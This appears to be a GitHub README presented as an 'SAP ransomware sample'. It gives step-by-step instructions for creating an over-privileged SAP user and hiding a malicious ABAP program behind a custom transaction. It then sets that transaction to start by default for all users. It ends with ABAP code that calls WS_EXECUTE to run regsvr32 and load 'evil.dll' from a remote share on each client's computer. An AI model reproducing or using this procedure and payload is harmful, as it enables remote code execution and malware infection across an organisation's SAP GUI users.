# SAP ransomware sample
Simple remote command execution exploit code for SAP GUI
First of all need to create a malicious ABAP program on SAP NetWeaver AS ABAP

1) First of all, to get RCE on a client’s computer, it is necessary to create a user with developer rights. The user SAP* cannot create or change any programs. To do this, run transaction su01 and  create a new user with SAP_ALL rights under login EVIL_DEV.
![](https://github.com/vah13/SAP_ransomware/blob/master/img/1.png)

2) Then, login as the EVIL_DEV user, run transaction se38 and create a program sap_malware_prog.
![](https://github.com/vah13/SAP_ransomware/blob/master/img/2.png)

3) Then when we are able to create a program, we click the Insert button, then copy a program, which executes malicious functionality, then save all and activate the program.
![](https://github.com/vah13/SAP_ransomware/blob/master/img/3.png)

4) Create custom transaction with se93
![](https://github.com/vah13/SAP_ransomware/blob/master/img/4.png)

5) Connect custom transaction to malware program
![](https://github.com/vah13/SAP_ransomware/blob/master/img/5.png)

6) Set mlauncher transaction by default 
![](https://github.com/vah13/SAP_ransomware/blob/master/img/6.png)

7) The screenshot shows that we set start transaction – mlauncher for all users. 
![](https://github.com/vah13/SAP_ransomware/blob/master/img/7.png)
![](https://github.com/vah13/SAP_ransomware/blob/master/img/8.png)
![](https://github.com/vah13/SAP_ransomware/blob/master/img/9.png)

## ABAP code for execute any command in SAP clients hosts
```
CALL FUNCTION 'WS_EXECUTE'
       EXPORTING
            program = 'c:\Windows\System32\regsvr32.exe'
            commandline     = '/i /s \\REMOTE_FOLDER\tmp\evil.dll'
            INFORM         = ''
           EXCEPTIONS
                  FRONTEND_ERROR        = 1
                  NO_BATCH                 = 2
                  PROG_NOT_FOUND           = 3
                  ILLEGAL_OPTION           = 4
                  GUI_REFUSE_EXECUTE       = 5
                  OTHERS                   = 6.
  ```
  
  using this vulnerability developers or sap administrator can execute any command on users computers and infected them
